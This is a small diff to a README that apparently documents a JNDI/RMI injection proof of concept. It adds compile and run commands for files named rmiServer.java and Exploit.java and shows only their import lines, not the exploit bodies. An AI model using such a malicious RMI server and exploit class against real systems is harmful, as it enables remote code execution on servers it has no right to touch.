@@ -32,6 +32,10 @@ public class poc {
 }
 ```
 ## rmiServer.java
+
+`javac rmiServer.java`
+`java rmiServer`
+
 ```
 import com.sun.jndi.rmi.registry.ReferenceWrapper;
 import javax.naming.Reference;
@@ -50,7 +54,11 @@ public class rmiServer {
 }
 ```
 
+
 ## Exploit.java
+
+`javac Exploit.java`
+
 ```
 import javax.naming.Context;
 import javax.naming.Name;
